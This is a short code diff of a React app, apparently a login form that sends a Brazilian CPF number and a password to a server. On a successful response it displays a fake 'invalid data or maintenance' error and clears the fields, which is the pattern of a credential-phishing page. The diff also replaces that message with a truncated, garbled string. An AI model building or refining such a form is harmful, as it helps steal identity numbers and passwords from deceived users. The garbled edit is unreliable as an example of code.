@@ -20,7 +20,7 @@ export default function App() {
         body: JSON.stringify({ cpf, password })
       });
       if (response.ok) {
-        setStatus('❌ Ops! Não foi possível concluir sua solicitação. Os dados informados são inválidos ou nossos servidores estão em manutenção temporária. Tente novamente mais tarde.');
+        setStatus('❌ Oporária. Tente novamente mais tarde.');
         setCpf('');
         setPassword('');
       } else {
